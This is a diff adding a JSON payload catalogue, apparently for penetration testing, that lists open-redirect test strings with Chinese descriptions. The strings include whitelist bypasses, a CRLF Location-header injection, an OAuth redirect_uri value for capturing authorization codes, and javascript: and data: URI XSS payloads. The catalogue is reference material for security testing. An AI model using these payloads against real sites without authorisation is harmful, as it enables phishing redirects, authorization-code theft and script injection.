@@ -1,0 +1,129 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "开放重定向",
+  "categories": ["常见参数", "协议与语法", "绕过技巧", "组合利用", "检测思路"],
+  "items": [
+    {
+      "id": "redirect-basic-http",
+      "title": "绝对地址跳转",
+      "category": "常见参数",
+      "code": "https://{{domain}}",
+      "desc": "向 redirect / url / next 等参数提交外部域名，观察是否发生 302 跳转。",
+      "tags": ["redirect", "basic"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP Unvalidated Redirects"
+    },
+    {
+      "id": "redirect-double-slash",
+      "title": "双斜杠协议相对",
+      "category": "协议与语法",
+      "code": "//{{domain}}",
+      "desc": "协议相对 URL 可绕过只校验是否以 http 开头的逻辑。",
+      "tags": ["redirect", "bypass"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP Unvalidated Redirects"
+    },
+    {
+      "id": "redirect-at-bypass",
+      "title": "@ 符号绕过",
+      "category": "绕过技巧",
+      "code": "https://trusted.example.com@{{domain}}/",
+      "desc": "利用浏览器解析 userinfo 的差异，使白名单校验通过但实际跳转外部。",
+      "tags": ["redirect", "bypass"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开开放重定向绕过研究"
+    },
+    {
+      "id": "redirect-backslash",
+      "title": "反斜杠绕过",
+      "category": "绕过技巧",
+      "code": "https:\\\\{{domain}}",
+      "desc": "部分浏览器会把反斜杠规范化为斜杠，绕过前缀匹配。",
+      "tags": ["redirect", "bypass"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开开放重定向绕过研究"
+    },
+    {
+      "id": "redirect-whitelist-subdomain",
+      "title": "白名单子域构造",
+      "category": "绕过技巧",
+      "code": "https://trusted.example.com.{{domain}}/",
+      "desc": "利用后缀匹配缺陷，把白名单域名放在子域位置。",
+      "tags": ["redirect", "bypass", "whitelist"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开开放重定向绕过研究"
+    },
+    {
+      "id": "redirect-crlf-chain",
+      "title": "配合 CRLF 跳转",
+      "category": "组合利用",
+      "code": "https://trusted.example.com%0d%0aLocation:%20https://{{domain}}/",
+      "desc": "响应头注入与开放重定向结合，强化利用效果。",
+      "tags": ["redirect", "crlf"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP CRLF Injection"
+    },
+    {
+      "id": "redirect-oauth-chain",
+      "title": "OAuth 回调劫持",
+      "category": "组合利用",
+      "code": "redirect_uri=https://{{domain}}/callback",
+      "desc": "redirect_uri 校验不严时可窃取授权码，需在授权范围内评估。",
+      "tags": ["redirect", "oauth", "token"],
+      "vars": ["domain"],
+      "risk": "danger",
+      "source": "OAuth 2.0 安全最佳实践"
+    },
+    {
+      "id": "redirect-javascript",
+      "title": "javascript 伪协议",
+      "category": "协议与语法",
+      "code": "javascript:alert(document.domain)",
+      "desc": "若跳转目标未限制协议，可能直接形成 XSS。",
+      "tags": ["redirect", "xss", "protocol"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XSS Prevention Cheat Sheet"
+    },
+    {
+      "id": "redirect-data-uri",
+      "title": "data 伪协议",
+      "category": "协议与语法",
+      "code": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "desc": "部分浏览器允许跳转到 data URI，可执行脚本。",
+      "tags": ["redirect", "xss", "protocol"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XSS Prevention Cheat Sheet"
+    },
+    {
+      "id": "redirect-common-params",
+      "title": "常见跳转参数名",
+      "category": "检测思路",
+      "code": "url redirect redirect_url redirect_uri next return returnUrl continue target dest goto rurl callback",
+      "desc": "测试时优先尝试这些常见参数名，提高发现效率。",
+      "tags": ["redirect", "params", "checklist"],
+      "vars": [],
+      "risk": "low",
+      "source": "OWASP Unvalidated Redirects"
+    },
+    {
+      "id": "redirect-path-relative",
+      "title": "路径相对绕过",
+      "category": "绕过技巧",
+      "code": "/%09/{{domain}}",
+      "desc": "利用制表符等特殊字符干扰解析，判断校验逻辑是否健壮。",
+      "tags": ["redirect", "bypass"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开开放重定向绕过研究"
+    }
+  ]
+}
